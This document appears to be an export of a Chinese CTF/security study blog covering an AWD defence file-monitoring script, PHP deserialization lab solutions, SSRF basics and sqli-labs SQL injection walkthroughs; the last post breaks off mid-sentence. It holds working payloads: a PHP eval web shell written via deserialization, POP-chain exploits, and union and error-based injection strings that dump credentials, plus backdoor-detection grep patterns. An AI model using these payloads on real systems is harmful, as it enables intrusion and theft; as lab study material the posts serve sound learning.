[{"title":"AWD的攻与防","url":"/2025/10/03/AWD%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2/","content":"AWD的攻与防AWD线下赛防守脚本：\n1.该脚本基于python，可直接在linux靶机上运行。\n2.开局直接运行起来，会自动对web目录进行备份，并建立hash索引。当web目录下有文件被删除或者被篡改的时候，会自动从备份中恢复文件。如果存在其他文件上传，会自动删除。\n3.无法避免的缺点：由于条件竞争，如果对方在我们删除shell之前就已经在内存中开始生成不死马了，还是有一定几率沦陷。\n# -*- coding: utf-8 -*-## awd文件监控脚本# author：说书人import osimport jsonimport timeimport hashlibdef ListDir(path):  # 获取网站所有文件    for file in os.listdir(path):        file_path = os.path.join(path, file)        if os.path.isdir(file_path):            if initialization[&#x27;ok&#x27;] == &#x27;false&#x27;:                dir_list.append(file_path)            else:                dir_list_tmp.append(file_path)            ListDir(file_path)        else:            if initialization[&#x27;ok&#x27;] == &#x27;false&#x27;:                file_list.append(file_path)            else:                file_list_tmp.append(file_path)def GetHash():  # 获取hash，建立索引    for bak in file_list:        with open(bak, &#x27;rb&#x27;) as f:            md5obj = hashlib.md5()            md5obj.update(f.read())        hash = md5obj.hexdigest()        bak_dict[bak] = hash    if os.path.exists(&#x27;/tmp/awd_web_hash.txt&#x27;) == False:        os.system(&#x27;mkdir /tmp/awd_web_bak/&#x27;)        os.system(&#x27;\\\\cp -a &#123;0&#125;* /tmp/awd_web_bak/&#x27;.format(web_dir))        with open(&#x27;/tmp/awd_web_hash.txt&#x27;, &#x27;w&#x27;) as f:  # 记录web文件hash            f.write(str(json.dumps(bak_dict)))        for i in file_list:  # 记录web文件列表            with open(&#x27;/tmp/awd_web_list.txt&#x27;, &#x27;a&#x27;) as f:                f.write(i + &#x27;\\n&#x27;)        for i in dir_list:  # 记录web目录列表            with open(&#x27;/tmp/awd_web_dir.txt&#x27;, &#x27;a&#x27;) as f:                f.write(i + &#x27;\\n&#x27;)def FileMonitor():  # 文件监控    # 提取当前web目录状态    initialization[&#x27;ok&#x27;] = &#x27;true&#x27;    for file in os.listdir(web_dir):        file_path = os.path.join(web_dir, file)        if os.path.isdir(file_path):            dir_list_tmp.append(file_path)            ListDir(file_path)        else:            file_list_tmp.append(file_path)    for file in file_list_tmp:        with open(file, &#x27;rb&#x27;) as f:            md5obj = hashlib.md5()            md5obj.update(f.read())        hash = md5obj.hexdigest()        bak_dict_tmp[file] = hash    with open(&#x27;/tmp/awd_web_hash.txt&#x27;, &#x27;r&#x27;) as f:  # 读取备份的文件hash        real_bak_dict = json.loads(f.read())    with open(&#x27;/tmp/awd_web_list.txt&#x27;, &#x27;r&#x27;) as f:  # 读取备份的文件列表        real_file_list = f.read().split(&#x27;\\n&#x27;)[0:-1]    with open(&#x27;/tmp/awd_web_dir.txt&#x27;, &#x27;r&#x27;) as f:  # 读取备份的目录列表        real_dir_list = f.read().split(&#x27;\\n&#x27;)[0:-1]    for dir in real_dir_list:  # 恢复web目录        try:            os.makedirs(dir)            print(&quot;[del-recover]dir:&#123;&#125;&quot;.format(dir))        except:            pass    for file in file_list_tmp:        try:            if real_bak_dict[file] != bak_dict_tmp[file]:  # 检测被篡改的文件，自动恢复                os.system(&#x27;\\\\cp &#123;0&#125; &#123;1&#125;&#x27;.format(file.replace(web_dir, &#x27;/tmp/awd_web_bak/&#x27;), file))                print(&quot;[modify-recover]file:&#123;&#125;&quot;.format(file))        except:  # 检测新增的文件，自动删除            os.system(&#x27;rm -rf &#123;0&#125;&#x27;.format(file))            print(&quot;[delete]webshell:&#123;0&#125;&quot;.format(file))    for real_file in real_file_list:  # 检测被删除的文件，自动恢复        if real_file not in file_list_tmp:            os.system(&#x27;\\\\cp &#123;0&#125; &#123;1&#125;&#x27;.format(real_file.replace(web_dir, &#x27;/tmp/awd_web_bak/&#x27;), real_file))            print(&quot;[del-recover]file:&#123;0&#125;&quot;.format(real_file))    file_list_tmp[:] = []    dir_list_tmp[:] = []os.system(&quot;rm -rf /tmp/awd_web_hash.txt /tmp/awd_web_list.txt /tmp/awd_web_dir.txt /tmp/awd_web_bak/&quot;)web_dir = &quot;/var/www/&quot;  # web目录，注意最后要加斜杠file_list = []dir_list = []bak_dict = &#123;&#125;file_list_tmp = []dir_list_tmp = []bak_dict_tmp = &#123;&#125;initialization = &#123;&#x27;ok&#x27;: &#x27;false&#x27;&#125;ListDir(web_dir)GetHash()while True:    print(time.ctime()+&quot;   安全&quot;)    FileMonitor()    time.sleep(1)  # 监控间隔，按需修改\n\n2.数据库恢复需要在配置文件里找到数据库的password然后用命令备份\nmysqldump -uroot -p –all-databases &gt; &#x2F;tmp&#x2F;databases.sql（备份所有数据库）\n恢复\n在mysql终端下执行\nsource  &#x2F;tmp&#x2F;databases.sql\nsource &#x2F;tmp&#x2F;mysql.sql\n2.弱口令\n实用命令\n查找可能的password\ncd /var/www/htmlfind .|xargs grep &quot;password&quot;\n\n查找后门\nfind /var/www/html -name &quot;*.php&quot; |xargs egrep &#x27;assert|eval|phpinfo\\(\\)|\\(base64_decoolcode|shell_exec|passthru|file_put_contents\\(\\.\\*\\$|base64_decode\\(&#x27;\n\n查找flag的位置\n使用 `find / -name *flag*` 或 `grep -rn &quot;flag&quot; *` 类似的语句可以快速发现 flag 所在的地方，方便后续拿分\n\n备份网站源码和数据库\n\nmobaxterm直接拖\n\n 备份数据库在dump源码部分有\n\nlinux命令进行备份\n\nscp -r -P Port remote_username&lt;a class=&quot;at-link&quot; title=&quot;@remote_ip&quot; href=&quot;https://github.com/remote_ip&quot;&gt;@remote_ip&lt;/a&gt;:remote_folder local_file\n\n检查有没有多余无用端口对外开放\nnetstat -anptl\n\n修改密码使用root登录，修改mysql数据库的user表\n使用password()函数进行密码加密注意修改完成后需要刷新权限use mysql;\nupdate user set password&#x3D;password(‘新密码’) where user&#x3D;’用户名’;\n例：update user set password&#x3D;password(‘123’) where user&#x3D;’root’;\n刷新权限：flush privileges;\n","tags":["AWD"]},{"title":"php反序列化","url":"/2026/02/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"PHP反序列化漏洞成因首先我们要知道序列化和反序列化的技术本来是用来对象状态的存储和恢复（主要用于储存，传输，cookie保存用户状态，缓存），序列化可以将对象转化为可以储存或传输的数据格式，而反序列化则是将这些数据进行复原。而在这些过程中，用户可自行控制上传序列化后的数据对象的环境下就可能导致漏洞。\n在某些情境下，应用程序在实现身份验证、文件读写、数据传输等关键功能的时候，可能会把序列化数据保存在外部储存中。如果这些数据没有进行加密或者签名处理，或者密钥泄露等等，则这些数据可以被恶意修改。\n早期如Fastjson早期版本这种已知存在安全缺陷的序列化库，也会增加程序被恶意攻击的风险。\n序列化和反序列化序列化：将php对象转换为字符串。其格式为类型：长度：值。\n举例：\nclass Hello &#123;public $name = &quot;hello&quot;&#125;echo serialize(new Hello());//O:5:&quot;Hello&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;&#125;\n\n标识:O是对象 s是字符串 i是整数\n属性不同的影响：\nprotected属性序列化为%00*%00属性名\nprivate属性序列化为%00类名%00属性名\n反序列化（unserialize()）：将字符串还原为对象。\n漏洞：\n用户可控输入（如$_GET[&#39;data&#39;]）直接传入unserialize()。\n反序列化过程自动触发魔术方法（如__wakeup()、__destruct()），若其中包含危险操作（如system()、file_put_contents()），则可能被恶意利用。\n\n魔术方法（触发方式）__construct \t当对象被创建时调用（实例化对象的时候自动调用）__destruct \t当对象被销毁前调用(当脚本执行结束时就会调用该方法)__sleep \t执行serialize函数前调用__wakeup \t执行unserialize函数前调用__toString \t在对象被当作字符串访问时调用__invoke \t在尝试以调用函数的方式调用一个对象时被调用__get \t获得类成因变量时调用__set \t设置类成员变量时调用__isset \t对不可访问或不存在的属性调用isset()或empty()时调用__unset \t对不可访问或不存在的属性调用unset()时调用__call \t在对象中调用不可访问的方法时调用__callStatic \t用静态方法调用不可访问方法时调用\n\n__construct:示范\n&lt;?phpclass Hello &#123;\tpublic function __construct() &#123;\t\techo &quot;对象创建成功！&quot;;\t&#125;&#125;$obj = new Hello();/实例化Hello对象\n\n$obj对象实例化执行__construct()函数\n__destruct:示范\n&lt;?phpclass Hello &#123;\tpublic function __construct() &#123;\t\techo &quot;对象创建成功！&quot;;\t&#125;\tpublic function __destruct() &#123;\t    echo &quot;喵喵喵&quot;;\t&#125;&#125;$obj = new Hello();/实例化Hello对象\n\n在执行完所有调用方法后，就会调用销毁函数。\n__sleep:示范\n&lt;?phpclass Hello&#123;    public function __sleep()&#123;        echo &quot;序列化完咯，该睡觉理~&quot;;\t&#125;&#125;$obj = new Hello();serialize($obj); //序列化对象\n\n在对象被序列化时被调用\n__Wakeup():示范\n&lt;?phpclass Hello&#123;    public function __wakeup()&#123;        echo &quot;反序列化了，该醒了~&quot;;\t&#125;&#125;$obj = new Hello();$serialize_obj = serialize($obj);unserialize($serialize_obj); //反序列化对象\n\n在对象被反序列化时被调用\n__toString:示范\n&lt;?phpclass Hello&#123;    public function __toString()&#123;        echo &quot;已输出字符串~&quot;;\t&#125;&#125;$obj = new Hello();echo $obj;\n\n把对象当成字符串输出时调用\n__invoke:示范\n&lt;?phpclass Hello&#123;    public function __invoke()&#123;        echo &quot;invoke~&quot;;\t&#125;&#125;$obj = new Hello();$obj();\n\n实例化对象后，以函数形式调用，就会触发该方法。\n当$obj()被执行过后就会成功调用invoke方法。\n__get:示范\n&lt;?phpclass Hello&#123;    public function __get($name        echo $name\t&#125;&#125;$obj = new Hello();$obj-&gt;hello;\n\n当访问一个对象不存在（或是不可访问）的属性时触发__get()方法。这里最后会输出hello。\n__set:示范\n&lt;?phpclass Hello&#123;    public function __set($name,$value)&#123;        echo $name.&quot;||&quot;.$value;\t&#125;&#125;$obj = new Hello();$obj-&gt;hello = &quot;hello&quot;;\n\n当给对象的不可访问（不存在）属性赋值时被调用。name指的是键名，value指的是值。\n最后输出为me||hello\n__isset:示范\n&lt;?phpclass Hello&#123;    public function __isset($a)&#123;        echo $a.&quot;&lt;br&gt;&quot;;\t&#125;&#125;$obj = new Hello();isset($obj-&gt;a);empty($obj-&gt;b);\n\n当用isset()或empty()判断该当前对象不可访问（不存在）属性的时候，就会调用__isset()函数，这里会输出a’\\n’b\n__unset:示范\n&lt;?phpclass Hello&#123;    public function __unset($a)&#123;        echo $a.&quot;&lt;br&gt;&quot;;\t&#125;&#125;$obj = new Hello();unset($obj-&gt;a);\n\n当使用unset()判断一个对象不存在（不可访问）属性的时候就会调用__isset()方法\n这里会输出a\n__call:示范\n&lt;?phpclass Hello&#123;    public function __call($class_name,$args)&#123;    \techo &quot;call调用&lt;br&gt;&quot;;        var_dump($class_name,$args);\t&#125;&#125;$obj = new Hello();$obj-&gt;test(&quot;test1&quot;,&quot;test2&quot;);\n\n该方法在调用的方法不存在时会自动调用，接收两个参数。\n这里test方法不存在所以会调用__call()\ntest是方法名，test1和test2是test方法的参数。这里的test1 test2是作为一整个数组传到args里的\n__callStatic():\n\n当该方法的对象要调用的静态方法不存在或者权限不足时候会调用该方法\n接受的参数为数组形式\n\n&lt;?phpclass Hello&#123;    private static function man()&#123;        echo &#x27;66666666&#x27;;    &#125;     public function __callStatic($function_name, $arg)    &#123;        echo  &quot;__callStatic调用成功&quot;;\t\tvar_dump($function_name,$arg);\t\tdie;        &#125;&#125;$a = new Hello();$a::test(&quot;参数1&quot;,&quot;参数2&quot;);//或 Hello::test(&quot;参数1&quot;,&quot;参数2&quot;); ?&gt;\n\n这里就会成功调用__callStatic()方法因为test()方法不存在。这里如果我们写成$a::name()也可以触发，因为我们将类实例化为对象后再调用函数就是从类的外部调用，此时因为它的私有属性所以我们无法访问。\nPHP反序列化漏洞1.参数提交（[极客大挑战 2019]PHP1）&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123;    private $username = &#x27;nonono&#x27;;    private $password = &#x27;yesyes&#x27;;    public function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function __wakeup()&#123;        $this-&gt;username = &#x27;guest&#x27;;    &#125;    function __destruct()&#123;        if ($this-&gt;password != 100) &#123;            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        &#125;        if ($this-&gt;username === &#x27;admin&#x27;) &#123;            global $flag;            echo $flag;        &#125;else&#123;            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;            die();                    &#125;    &#125;&#125;?&gt;2\n\nindex.php\n&lt;?php    include &#x27;class.php&#x27;;    $select = $_GET[&#x27;select&#x27;];    $res=unserialize(@$select);    ?&gt;\n\n这里涉及到wakeup方法的绕过因为当反序列化执行时wakeup一定会被触发此时username会被替换成guest导致我们的传参失败\n关于__wakeup()方法绕过：当序列化字符串中对象属性数量大于实际值时（如O:4:&quot;User&quot;:2&#123;&#125;），__wakeup()不执行。PHP版本须在8.0以前\n因此本题(注意要顶替的数据类型要一致)\n&lt;?php\tclass Name&#123;    private $username = &#x27;admin&#x27;;    private $password = &#x27;100&#x27;;        &#125;    $a = new Name();    echo serialize($a);\n\n修改对象数改为3 这里要把%00补上 \nO:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;\n\n2.控制__destruct方法删除或者写入指定目录下的文件（ctfshow web261） &lt;?phphighlight_file(__FILE__);class ctfshowvip&#123;    public $username;    public $password;    public $code;    public function __construct($u,$p)&#123;        $this-&gt;username=$u;        $this-&gt;password=$p;    &#125;    public function __wakeup()&#123;        if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123;            die(&#x27;error&#x27;);        &#125;    &#125;    public function __invoke()&#123;        eval($this-&gt;code);    &#125;    public function __sleep()&#123;        $this-&gt;username=&#x27;&#x27;;        $this-&gt;password=&#x27;&#x27;;    &#125;    public function __unserialize($data)&#123;        $this-&gt;username=$data[&#x27;username&#x27;];        $this-&gt;password=$data[&#x27;password&#x27;];        $this-&gt;code = $this-&gt;username.$this-&gt;password;    &#125;    public function __destruct()&#123;        if($this-&gt;code==0x36d)&#123;            file_put_contents($this-&gt;username, $this-&gt;password);        &#125;    &#125;&#125;unserialize($_GET[&#x27;vip&#x27;]);\n\n0x36d为877这里由于&#x3D;&#x3D;符号的弱比较会把字符串转成数字值所以code拼接过后的877.php…只会识别前面的数字877\n且这里不需要进行wakeup()的绕过因为在PHP8.0+版本    如果一个类同时存在 __unserialize() 和 __wakeup()只有 __unserialize() 会被调用__wakeup() 完全被忽略，不会触发\n&lt;?phpclass ctfshowvip&#123;    public $username = &#x27;877.php&#x27;;    public $password = &#x27;&lt;?php @eval($_POST[\\&#x27;cmd\\&#x27;]);?&gt;&#x27;;&#125;$a = new ctfshowvip();echo urlencode(serialize($a));\n\n3.pop链（[MRCTF2020]Ezpop） &lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123;    protected  $var = &#x27;flag.php&#x27;;    public function append($value)&#123;        include($value);//1.$value = flag.php 要触发append()    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);//2.修改var的值传到$value     &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file=&#x27;index.php&#x27;)&#123;        $this-&gt;source = $file;        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;//5.$source = new Show ();    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;//4.str中没有属性source这里可以触发需要$str = new Test();    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();//3.这里可以触发invoke 需要$p = new Modifier()    &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123;    $a=new Show;    highlight_file(__FILE__);&#125; $a = new Show();$a-&gt;source = new Show();$a-&gt;source-&gt;str = new Test();$a-&gt;source-&gt;str-&gt;p = new Modifier();echo serialize($a);//(这里因为protect属性如果直接传序列化时要把丢失的%00补回去的如果不想最好写成)//echo urlencode(serialize($a));\n\n根据步骤写出payload直接在底下写就行\n这道题由于flag.php里面不输出flag{}所以需要查看源码 var值应该改为resource协议读取源码\n&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;\n\n","tags":["php反序列"]},{"title":"ssrf服务端请求伪造攻击","url":"/2025/09/10/ssrf%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/","content":"SSRF服务端请求伪造攻击服务端请求伪造（Server Side Request Forgery, SSRF），理解为攻击者在没有服务器权限的情况下，利用服务器的漏洞伪装成服务器发起请求的攻击，由于请求是在服务器发起的所以攻击目标一般就是外网无法访问的内部系统\n一般来说会有两个网站1.A网站，所有人都可以访问的外网网站2.B网站，只能内部访问的B网站3，可以通过A网站访问B网站4.所以作为普通用户，我们可以访问A网站，然后篡改获取资源的来源请求B网站的资源，此时A网站并没有对我们的请求做出检测也就是说我们有机会用自己A网站的普通用户身份去访问B网站。\n\nSSRF能干什么可以对服务器所在内网进行端口扫描\n向内部任意主机的任意端口发送恶意构造的数据包，攻击在内网或本地的应用\n利用file协议读取本地文件\nDos 攻击（请求大文件，始终报错keep-alivew alway）\nSSRF漏洞分类根据是否会回显分为三类：\n   1.Basic SSRF:在相应内容中会返回结果。例如，传送一个网址会直接返回这个网址的界面或者对应的html内容，也就是所谓的A网站访问B网站\n   2.Blind SSRF:响应中不返回服务器中的任何信息\n   3.Semi SSRF:响应中不返回请求结果中的所有详细信息，但是会暴露一些数据信息\nSSRF原理SSRF漏洞出现的原因大多是服务端提供了从其他服务器应用获取数据的功能，并且没有对目标地址做正确的过滤与限制。攻击者就有从服务器访问指定URL的网页文本内容，加载图片资源等等，并且由于自身网站并没有做出身份验证等过滤防御行为（也就是没有对发出的请求做身份识别）就会导致用A网站的普通身份访问了B网站\nPHP函数的使用不当可能会导致该漏洞产生具体代码如下\nfile_get_contents()fsockopen()curl_exec()\n\n","tags":["ssrf"]},{"title":"sql注入","url":"/2025/08/25/sql%E6%B3%A8%E5%85%A5/","content":"sqli-labs通关1.联合注入（less 1）1.注入点是否存在 即是否有闭合报错,输入id&#x3D;1‘\n2.利用注释符号–+\n3.利用order by 函数观察查询表的列数\n4.查询后利用联合注入爆出注入点\n5.执行恶意查询指令database()\n6.查询该库下的所有表名group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+\n\n7.查询列名\ngroup_concat(column_name) from information_schema.columns where table_name&#x3D;’user’–+\n\n8.查询列里的字段\n\n2.less 2 (数字型注入只有在开头检测有差别)\n\n\n\n直观感受下原代码是 “i’（less1也就是字符型这里需要读取封闭符号取字符串）\n\n\n\nless2 你不管怎么去改它的数字都不会发生变化但是你改封闭符号个数会跳出来再进一步探索\n\n你就会发现它根本不识别字符串这里跳出来数字了所以这里一定读取的是值那就不能出现封闭的情况不然就会被识别为字符串\n一些帮助理解的知识点在MySQL中，把 information_schema  看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。**select：用于指定查询中要返回的字段，如部分已有字段、全部字段（*）、新增计算字段from：**指定查询的数据来源，即表名**where：**用于过滤数据，根据指定的条件排除不符合条件的行**group by：**对字段进行分组聚合，通常与聚合函数一起使用，以便对每个组执行统计或计算**having：**对分组后的结果进行过滤，适用于基于聚合函数的条件筛选**order by：**对查询结果进行排序，可以指定排序的列默认升序，降序要加desc**limit：**限制查询返回的行数，如limit n返回前n行、limit m,n返回m+1到m+n行这里解释了为什么在最后拼接字符段不再需要where的出现，也解释了为什么在from中不需要‘’而where需要的原因。\n3.less3依旧是新的报错需要猜测它原来的查询语句\n\n这里应该是（’i’)其他运用联合注入就可以了\n4.less4\n\n差报错推测原输入为(‘“i”)所以输入要是1”)–+\n接着利用联合注入即可\n5.less 5（报错注入即双注入）无回显点利用group by函数特性创造回显点没有可利用回显点需要学习新东西\nhttps://www.freesion.com/article/9958528915/\n原理：子查询在查询进行时子查询是优先进行的\n\nRand() &#x2F;&#x2F;随机函数，用于产生 0 至 1 之间的随机数\n\nFloor() &#x2F;&#x2F;取整函数，向下舍入为指定小数位数 如：floor(1.45,0)&#x3D; 1;floor(1.55,0) &#x3D; 1\n\nCount() &#x2F;&#x2F;汇总函数\n\nGroup by clause &#x2F;&#x2F;分组语句（利用函数特性）简单的一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用 Group by 分组语句就会把查询的一部分以错误的形式显示出来。\n\n\n\n\n深层次的原因：通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)**2)的不确定性，即可能为0也可能为1（group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。）group by  floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。\n结论是：当与临时表里面的值进行比较，如果不同，就插入，但是插入的时候又计算了一次，所以如果插入时计算的值与直接比较的值不一样，则报错！\n\n参考他人博客\n自我总结：可以理解为在group by 读取数据并且保存在临时表的过程中由于floor（random(0)*2）会出现0和1的性质那么在检测时就会出现security0和security1但是在写入临时表的过程中又被计算了一遍也就是说security0写入可能变成security1，那这时候就重复了，重复就会报错告诉你security1重复了那你也就得到了数据库名了。注意的是可能也就是说有时候需要多次刷新才会显示\n套路公式\npayload：?id=-1&#x27; union select count(*),2,concat((select database()),&#x27;*&#x27;,floor(rand()*2))as a from information_schema.tables group by a--+ 这里把查询库的名字命名为a\n\n（这里是需要修改limit的比如limit 1，1 limit 2，1然后一个个去看这里会比较麻烦一些）\n把最终的payload放出来看眼\n?id=-1&#x27; union select count(*),2,concat(&#x27;*&#x27;,(select concat_ws(char(32,44,32),id,username,password) from users limit 1,1),&#x27;*&#x27;,floor(rand()*2))as a from information_schema.tables group by a--+  \n\n\n\n5.less6，9，10（延迟注入法也是报错注入的一种时间盲注）上面的报错注入一样可以用利用sleep（）函数去看漏洞\nhttps://blog.csdn.net/qq_68357559/article/details/137127366\n这个博客里介绍的就可以但是比上面的还要麻烦这个需要利用if函数和sleep函数去尝试出库和表的ASCII码值等于要看你页面延迟然后一个个试很麻烦\n这里我看了另外一种不是利用if函数\n报错注入最全链接https://blog.csdn.net/haishiqiguai/article/details/147591123（写的确实豪）5.less6报错注入updatexml（）函数版https://blog.csdn.net/haishiqiguai/article/details/147591123\n利用updatexml函数\n6.Less7 导出文件GET字符型注入这个是纯试出来的?id&#x3D;1’))–+\n然后用and测试length（database()）测出来是9\n\n然后甚至可以用substr（）一点点爆字母 and substr(database(),1,1)&#x3D;’s’\n这里用导入文件的方式\n用到两个函数 要去前面几关去获取\nbasedir()指定了安装MYSQL的安装路径\ndatadir()指定了安装MYSQL的数据文件路径\n\n:D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\\nD:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\\n\n放个payload吧页面回显失败但是我的文件夹里还是没有出现hack.php失败了，\n这里下一步直接连接蚁剑就可以了。\n7.Less-8，9，10和上面一样用substr一个个爆https://blog.csdn.net/qq_43531669/article/details/96746687\n这篇博客就是专门爆的里面还附带了脚本避免了手工注入的繁复\n8.Less-11Post注入万能密码 admin’ and true# 或者 admin’ or 1&#x3D;1#\n登录成功以后联合查询即可\nless12和上面一样只是改成了(“i”)\n\nless13 password是注入点万能密码123’) or 1&#x3D;1# 这个是无回显爆破相当恶心\nless14和上题一样less15时间延迟但是还是爆破总结感觉sql其实挺公式化的无回显点的时候甚至可以无脑爆破\n也学到挺多的无回显注入还得是脚本方便一个个爆真的构式\n","tags":["sql"]},{"title":"sql注入2","url":"/2025/11/21/sql%E6%B3%A8%E5%85%A52/","content":"SQL注入关于漏洞介绍，sql是一种常见的网络攻击形式，攻击者通过操控sql查询语句，从而达到篡改数据、泄露敏感信息、甚至控制数据库的目的。\n1.sql的漏洞成因SQL 注入漏洞通常是由于对用户输入的数据缺乏适当的校验和过滤，导致恶意代码被直接注入到 SQL 查询语句中，改变了原本的查询逻辑。\n这些通常是开发者对用户输入的参数过滤不严格，导致用户输入的数据能够影响预设查询功能的一种技术，通常将导致数据库原有信息泄露、篡改，甚至被删除。\n实例查询语句:（）\nString query = &quot;SELECT * FROM users WHERE username = &#x27;&quot; + userInput + &quot;&#x27; AND password = &#x27;&quot; + passwordInput + &quot;&#x27;;&quot;;\n\n开发者的本意确实是让用户输入的用户名和密码与数据库中的记录进行匹配验证然后返回前端为真执行查询。（这里的场景就可能是登录等等）\n如果用户输入为 userInput = &#39; OR &#39;1&#39;=&#39;1，那么 SQL 语句将变为：\nSELECT * FROM users WHERE username = &#x27;&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; AND password = &#x27;&#x27;;\n\n这样，SQL 查询总是返回所有用户，因为 &#39;1&#39;=&#39;1&#39; 永远为真。\nSQL注入漏洞对于数据安全的影响：\n数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。网页篡改：通过操作数据库对特定网页进行篡改。网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。服务器被远程控制，被安装后门：经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。破坏硬盘数据，瘫痪全系统。\n2.sql注入——脱库1.联合查询参考语句\n$msg=mysqli_query($con,&quot;update prequest set remark=&#x27;&quot;.$_POST[&#x27;adminremark&#x27;].&quot;&#x27; where id=&#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27;&quot;);\n\n步骤：?id&#x3D;1’ (测试是否存在注入点，报错即存在)，多出的单引号无法完成闭合\n?id&#x3D;1’– - (注释掉后续多余的项，测试页面回显是否正常)\n?id&#x3D;1’ order by n– - (n&#x3D;1,2,3…，使用order来测试字段长度，报错时说明超出了最大的长度)\n?id&#x3D;-1’ union select 1,2,3– - (在当前页面中寻找回显点)（为什么是-1呢）\n?id&#x3D;-1’ union select 1,2,database()– - (在回显点3的位置，显示出当前数据库的名字)\n?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()– -\n?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’XXX’– -\n?id&#x3D;-1’ union select 1,2,group_concat(username,0x3a,passowrd) from XXX– -\n这里面有两个关键点-1是一个空表，union select 可以合并两个表格，order by 原本是为了让表中的数据根据列进行排序\n三个融合就可以达到在空表中回显你任意查询的语句\n一些帮助理解的知识点在MySQL中，把 information_schema  看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。**select：用于指定查询中要返回的字段，如部分已有字段、全部字段（*）、新增计算字段from：**指定查询的数据来源，即表名**where：**用于过滤数据，根据指定的条件排除不符合条件的行**group by：**对字段进行分组聚合，通常与聚合函数一起使用，以便对每个组执行统计或计算**having：**对分组后的结果进行过滤，适用于基于聚合函数的条件筛选**order by：**对查询结果进行排序，可以指定排序的列默认升序，降序要加desc**limit：**限制查询返回的行数，如limit n返回前n行、limit m,n返回m+1到m+n行这里解释了为什么在最后拼接字符段不再需要where的出现，也解释了为什么在from中不需要‘’而where需要的原因。\n2.报错注入(双注入)演示：floor报错：原理：子查询在查询进行时子查询是优先进行的\n\nRand() &#x2F;&#x2F;随机函数，用于产生 0 至 1 之间的随机数\n\nFloor() &#x2F;&#x2F;取整函数，向下舍入为指定小数位数 如：floor(1.45,0)&#x3D; 1;floor(1.55,0) &#x3D; 1\n\nCount() &#x2F;&#x2F;汇总函数\n\nGroup by clause &#x2F;&#x2F;分组语句（利用函数特性）简单的一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用 Group by 分组语句就会把查询的一部分以错误的形式显示出来。\n\n\n\n\n深层次的原因：通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)**2)的不确定性，即可能为0也可能为1（group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。）group by  